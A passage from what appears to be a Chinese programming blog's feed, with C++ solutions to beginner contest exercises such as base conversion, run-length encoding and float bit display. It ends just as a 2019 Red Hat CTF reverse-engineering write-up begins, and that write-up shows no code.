class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hex2int</span><span class="params">(<span class="keyword">char</span> tmp)</span>              <span class="comment">//这个函数 在逆向中 经常 见到呢！</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((tmp &gt;= <span class="string">'A'</span>) &amp;&amp; (tmp &lt;= <span class="string">'Z'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tmp - <span class="string">'A'</span> + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((tmp &gt;= <span class="string">'a'</span>) &amp;&amp; (tmp &lt;= <span class="string">'z'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tmp - <span class="string">'a'</span> + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((tmp &gt;= <span class="string">'0'</span>) &amp;&amp; (tmp &lt;= <span class="string">'9'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tmp - <span class="string">'0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">zhuan</span><span class="params">(<span class="keyword">char</span> *a1,<span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shi=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="built_in">strlen</span>(a1);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> tmp=a1[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">int</span> b1=hex2int(tmp);</span><br><span class="line">shi+=b1*<span class="built_in">pow</span>(a2,<span class="built_in">strlen</span>(a1)-i);<span class="comment">//pow(底数,指数)  头文件#include&lt;cmath&gt;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shi;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a1[<span class="number">50</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a2;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a1&gt;&gt;a2;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;zhuan(a1,a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="压缩数据"><a href="#压缩数据" class="headerlink" title="压缩数据"></a>压缩数据</h1><h5 id="描述：-3"><a href="#描述：-3" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>设计程序：假设有一个长度小于80的字符串（其中包含A、C、G 和T 四种字符），使用如下方法为它编码： （1）将字符串中的k 个连续的相同字符写成kX，X 是A、C、G 和T 四个字符之一； （2）如果k 是1，那么1 要忽略。 输入一个字符串，输出它的编码。</p></blockquote><h5 id="样例输入：-2"><a href="#样例输入：-2" class="headerlink" title="样例输入："></a>样例输入：</h5><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AACAATGGGG</span></span><br></pre></td></tr></table></figure><h5 id="样例输出：-3"><a href="#样例输出：-3" class="headerlink" title="样例输出："></a>样例输出：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>AC2AT4G</span><br></pre></td></tr></table></figure><h5 id="AC代码：-3"><a href="#AC代码：-3" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//AACAATGGGG</span></span></span><br><span class="line"><span class="function"><span class="comment">//2AC2AT4G</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> tmp=s[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=s.length();i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]==tmp)</span><br><span class="line">num=num+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">1</span>)</span><br><span class="line"> <span class="built_in">cout</span>&lt;&lt;tmp;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;num&lt;&lt;tmp;</span><br><span class="line">tmp=s[i];</span><br><span class="line">num=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="浮点型数据显现"><a href="#浮点型数据显现" class="headerlink" title="浮点型数据显现"></a>浮点型数据显现</h1><h5 id="描述：-4"><a href="#描述：-4" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>Float型数据在内存中占有四个字节，按小端数据存储（小端存储即低地址存放的最低字节），编写输入一个浮点型数据，并使用函数显示出一个浮点数据从高位到低位的二进制数据的功能。</p></blockquote><h5 id="样例输入：-3"><a href="#样例输入：-3" class="headerlink" title="样例输入："></a>样例输入：</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5<span class="selector-class">.2</span></span><br></pre></td></tr></table></figure><h5 id="样例输出：-4"><a href="#样例输出：-4" class="headerlink" title="样例输出："></a>样例输出：</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Show-bit:</span> <span class="number">01000000</span>  <span class="number">10100110</span>  <span class="number">01100110</span>  <span class="number">01100110</span></span><br></pre></td></tr></table></figure><h5 id="AC代码：-4"><a href="#AC代码：-4" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这题的意思就是将 将小段存储  转成 大段形式  输出 出来！</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bin_print</span><span class="params">(<span class="keyword">float</span> *a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> temp;<span class="comment">//char i,j,temp;</span></span><br><span class="line"><span class="keyword">char</span> *p=(<span class="keyword">char</span> *)a;<span class="comment">//66 66 A6 40  小段存储格式 </span></span><br><span class="line">p+=<span class="number">3</span>;             <span class="comment">//指向   40    二进制为  0100 0000 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Show-bit: "</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">temp=*p;<span class="comment">//此时temp[0]为   0 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp&amp;<span class="number">0x80</span>)<span class="comment">//0x80    二进制为   1000 0000 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"0"</span>;</span><br><span class="line">temp&lt;&lt;=<span class="number">1</span>; <span class="comment">//此时1000 0000   所以temp[0]为 1 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">3</span>)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">p--;           <span class="comment">//指向了    66 66 A6 40中的A6  二进制为 1010 0110 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a; <span class="comment">//5.2    16进制为    40A66666 </span></span><br><span class="line">bin_print(&amp;a);<span class="comment">//引用 </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="modbus协议"><a href="#modbus协议" class="headerlink" title="modbus协议"></a>modbus协议</h1><h5 id="描述：-5"><a href="#描述：-5" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>工业现场现有一个温湿度传感器，数据发送采用modbus协议，modbus协议是一种工业现场控制协议，每帧数据采用十六进制方式按字节传输，在此截取传感器发送给计算机的一帧数据，并存入至data数组中：</p></blockquote><blockquote><p>十六进制数据 Hex: D8 07 80 03 00 00 08 48 E1 EA 40 9A 99 B5 41 F3</p></blockquote><blockquote><p>1、2位是传感器地址，传感器地址是一个2字节数据，低字节在前高字节在后。3、4、5、6位是控制指令码，第7位是数据长度，代表后面温湿度的数据长度为8个字节，</p></blockquote><blockquote><p>第8、9、10、11位是湿度浮点型数据先传输低位字节后传输高位字节共4个字节，12、13、14、15位是温度的浮点型数据传输方式同湿度描述一样，</p></blockquote><blockquote><p>第16位是CRC冗余校验结果，CRC冗余校验是对前面所有字节的多项式异或运算结果，其作用是保证数据传输的完整性，</p></blockquote><blockquote><p>在不考虑校验位的情况下编写程序取出设备的地址、湿度、温度值并显示。</p></blockquote><h5 id="输出结果为："><a href="#输出结果为：" class="headerlink" title="输出结果为："></a>输出结果为：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Device <span class="attribute">address</span>=2008</span><br><span class="line"><span class="attribute">Humidity</span>=7.34</span><br><span class="line"><span class="attribute">Temperature</span>=22.70</span><br></pre></td></tr></table></figure><h5 id="AC代码：-5"><a href="#AC代码：-5" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下次更吧，不太明白!</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/17/MsBTUS.jpg" alt="MsBTUS.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;备战，备战！！！&lt;/p&gt;
    
    </summary>
    
    
      <category term="备战2020ACM" scheme="http://yoursite.com/tags/%E5%A4%87%E6%88%982020ACM/"/>
    
  </entry>
  
  <entry>
    <title>A1183_阿里的新游戏</title>
    <link href="http://yoursite.com/2019/11/17/A1183_%E9%98%BF%E9%87%8C%E7%9A%84%E6%96%B0%E6%B8%B8%E6%88%8F/"/>
    <id>http://yoursite.com/2019/11/17/A1183_阿里的新游戏/</id>
    <published>2019-11-17T15:00:19.000Z</published>
    <updated>2019-11-20T13:44:19.244Z</updated>
    
    <content type="html"><![CDATA[<p>备战，备战！！！</p><a id="more"></a><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">时间限制：<span class="number">1000</span>ms</span><br><span class="line">内存限制：<span class="number">131072</span>K</span><br><span class="line">题目来源：<span class="number">2017</span> 计蒜之道 初赛 第一场</span><br></pre></td></tr></table></figure><h1 id="阿里的新游戏"><a href="#阿里的新游戏" class="headerlink" title="阿里的新游戏"></a>阿里的新游戏</h1><h5 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h5><blockquote><p>阿里九游开放平台近日上架了一款新的益智类游戏——成三棋。成三棋是我国非常古老的一个双人棋类游戏，其棋盘如下图所示：</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/17/MswJbT.png" alt="MswJbT.png"></p><blockquote><p>成三棋的棋盘上有很多条线段，只能在线段交叉点上放入棋子。我们可以用坐标系来描述棋盘：<br><img src="https://s2.ax1x.com/2019/11/17/MswtVU.png" alt="MswtVU.png"></p></blockquote><blockquote><p>如果一条线段上的三个交叉点都被同一玩家的棋子占据的话，则称这条线段被该玩家 成三。现在，小红和小明两人在游戏平台上下棋，其中小红的棋子是黑色的。请你帮小红计算他成三的线段数。</p></blockquote><blockquote><p>样例对应的棋盘如下：<br><img src="https://s2.ax1x.com/2019/11/17/MswGrV.png" alt="MswGrV.png"></p></blockquote><h5 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h5><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入第一行两个整数 <span class="built_in">n</span>,m(<span class="number">3</span> \le <span class="built_in">n</span>, m \le <span class="number">9</span>)<span class="built_in">n</span>,m(<span class="number">3</span>≤<span class="built_in">n</span>,m≤<span class="number">9</span>)，<span class="built_in">n</span> 表示小红的棋子数，m 表示小明的棋子数。</span><br><span class="line"></span><br><span class="line">接下来 <span class="built_in">n</span> 行输入小红的棋子坐标。</span><br><span class="line"></span><br><span class="line">接下来 m 行输入小明的棋子坐标。</span><br><span class="line"></span><br><span class="line">输入保证坐标合法，并且棋子之间不重合。</span><br></pre></td></tr></table></figure><h5 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出小红成三的线段数。</span><br></pre></td></tr></table></figure><h5 id="样例输入："><a href="#样例输入：" class="headerlink" title="样例输入："></a>样例输入：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span> <span class="number">3</span></span><br><span class="line"><span class="number">-1</span> <span class="number">0</span></span><br><span class="line"><span class="number">-2</span> <span class="number">0</span></span><br><span class="line"><span class="number">-3</span> <span class="number">0</span></span><br><span class="line"><span class="number">-1</span> <span class="number">-1</span></span><br><span class="line"><span class="number">-1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h5 id="样例输入：-1"><a href="#样例输入：-1" class="headerlink" title="样例输入："></a>样例输入：</h5><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h5 id="AC代码："><a href="#AC代码：" class="headerlink" title="AC代码："></a>AC代码：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//思路很重要</span></span><br><span class="line">    <span class="comment">//数组  x,y表示 x,y坐标    x:下 s：上 z：左  y:右 汉字首字母</span></span><br><span class="line">    <span class="comment">//成三的可能   y=-1 -2 -3   定义  数组yx[4]   if y&lt;0 yx[-y]++</span></span><br><span class="line">    <span class="comment">//            y= 1 2 3              ys[4]    if y&gt;0 yd[y]++</span></span><br><span class="line">    <span class="comment">//             x=-1 -2 -3           xz[4]     if x&lt;0 xz[-x]++</span></span><br><span class="line">    <span class="comment">//             x=  1 2 3            xy[4]      if x&gt;0 zy[x]++  </span></span><br><span class="line">    <span class="comment">//每个数组的下位为 0  仍未赋值  我们用它 分别来保存  下面的成三 可能</span></span><br><span class="line">    <span class="comment">//          x=0左，右   if x=0 y&lt;0    yx[0]++     if x=0 y&gt;0    ys[0]++    </span></span><br><span class="line">    <span class="comment">//          y=0  上，下  if y=0 x&lt;0    xz[0]++     if x=0 y&gt;0    zy[0]++ </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//先定义  4个数组  保存每个线段上的状态</span></span><br><span class="line">    <span class="keyword">int</span> yx[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;,ys[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;,xz[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;,xy[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;<span class="comment">//输入小红 的棋子个数 和  小明的棋子个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)<span class="comment">//输入小红每个棋子 所在的位置  并记录下 每条</span></span><br><span class="line">    &#123;<span class="comment">//对每个棋子 都进行一次判断 看落在了  哪个线段上</span></span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">if</span>(y&lt;<span class="number">0</span>)</span><br><span class="line">            yx[-y]++;</span><br><span class="line">        <span class="keyword">if</span>(y&gt;<span class="number">0</span>)</span><br><span class="line">            ys[y]++;</span><br><span class="line">         <span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">            xz[-x]++;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">            xy[x]++;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span>&amp;&amp;y&lt;<span class="number">0</span>)</span><br><span class="line">            yx[<span class="number">0</span>]++;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span>&amp;&amp;y&gt;<span class="number">0</span>)</span><br><span class="line">            ys[<span class="number">0</span>]++;</span><br><span class="line">        <span class="keyword">if</span>(y==<span class="number">0</span>&amp;&amp;x&lt;<span class="number">0</span>)</span><br><span class="line">            xz[<span class="number">0</span>]++;</span><br><span class="line">        <span class="keyword">if</span>(y==<span class="number">0</span>&amp;&amp;x&gt;<span class="number">0</span>)</span><br><span class="line">            xy[<span class="number">0</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)<span class="comment">//输入小红每个棋子 所在的位置  并记录下 每条</span></span><br><span class="line">    <span class="comment">//但不用  判断     它们落在了  哪个线段上</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;<span class="comment">//成三的线段数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)<span class="comment">//对每个数组进行循环  每个数组的每个下标就是一个线段的状态</span></span><br><span class="line">                        <span class="comment">//都数组下标上的值 为 3  就表示 该线段 成三了</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(yx[i]==<span class="number">3</span>)</span><br><span class="line">            num++;</span><br><span class="line">        <span class="keyword">if</span>(ys[i]==<span class="number">3</span>)</span><br><span class="line">            num++;</span><br><span class="line">        <span class="keyword">if</span>(xz[i]==<span class="number">3</span>)</span><br><span class="line">            num++;</span><br><span class="line">        <span class="keyword">if</span>(xy[i]==<span class="number">3</span>)</span><br><span class="line">            num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;num&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//输出成三 数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/17/MsBTUS.jpg" alt="MsBTUS.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;备战，备战！！！&lt;/p&gt;
    
    </summary>
    
    
      <category term="备战2020ACM" scheme="http://yoursite.com/tags/%E5%A4%87%E6%88%982020ACM/"/>
    
  </entry>
  
  <entry>
    <title>2019redhat之re XXctf</title>
    <link href="http://yoursite.com/2019/11/16/2019redhat%E4%B9%8Bre%20XXctf/"/>
    <id>http://yoursite.com/2019/11/16/2019redhat之re XXctf/</id>
    <published>2019-11-16T04:12:03.000Z</published>
    <updated>2019-11-24T08:45:28.761Z</updated>
    
    <content type="html"><![CDATA[<p>红帽杯的参加，发现自己，太多知识没有掌握了！记录下！<br>这里有个将 内存型数据 准转化为 正常型的代码！然后，对未知字符爆破的脚本，以及xxTea的快速解密代码！</p><a id="more"></a><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//github</span>.com/Prowes5/Prowes5.github.io/blob/faf93e17bc0632e5ac6dbd60efef274d87105133/<span class="number">2019</span>/<span class="number">11</span>/<span class="number">14</span>/%E7%BA%A2%E5%B8%BD%E6%9D%AFReverse-writeup%E5%8F%8A%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/index.html</span><br><span class="line">//上面是个  html文件   保存在 本地，再在浏览器打开就好！</span><br><span class="line">https:<span class="regexp">//impakho</span>.com/post/redhat-<span class="number">2019</span>-online-writeup<span class="comment">#toc-4</span></span><br><span class="line">https:<span class="regexp">//xz</span>.aliyun.com/t/<span class="number">6746</span><span class="comment">#toc-6</span></span><br></pre></td></tr></table></figure><h2 id="拖入ida-64"><a href="#拖入ida-64" class="headerlink" title="拖入ida 64"></a>拖入ida 64</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 